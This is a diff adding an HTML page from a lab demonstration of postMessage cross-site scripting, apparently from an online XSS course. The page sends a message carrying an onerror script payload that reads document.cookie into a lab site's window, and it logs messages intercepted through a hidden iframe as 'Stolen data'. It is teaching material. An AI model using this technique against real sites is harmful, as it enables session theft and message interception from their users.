@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<!-- This is a lab demonstration of postMessage XSS for https://cybr.com's
+    Cross-Site Scripting (XSS): The 2021 Guide -->
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>malicious_website</title>
+</head>
+
+<body>
+  <h2 id="name">Welcome back</h2>
+  <h3 id="notifs">Error loading notifications, please refresh <button onclick="buttonClicked()">Reload</button></h3>
+  <script type="text/javascript">
+    function buttonClicked() {
+      var domain = 'http://cybr-lab-postmessage-xss.s3-website-us-east-1.amazonaws.com/'; // window A
+      var loadWindow = window.open(domain);
+
+      // delay for a few seconds
+      setTimeout(function() {
+        var message = {
+          "userID": "34",
+          "userFName": "Christophe",
+          "notificationCount": "8 <img src=x onerror=alert(document.cookie)>"
+        };
+        console.log('Malicious message being sent: ' + JSON.stringify(message));
+        loadWindow.postMessage(message, domain); //send the message and target URI
+      }, 3000); // 3 seconds
+    }
+
+    /** Step 2 **/
+    // embed iframe and steal messages
+    function stealMessage(event) {
+      console.log("Stolen data: " + JSON.stringify(event.data));
+    }
+    window.addEventListener("message", stealMessage, false);
+  </script>
+  <iframe id="notifs-iframe" src="http://cybr-lab-postmessage-xss-notifs.s3-website-us-east-1.amazonaws.com/window_b.html" style="display:none;"></iframe>
+</body>
+
+</html>
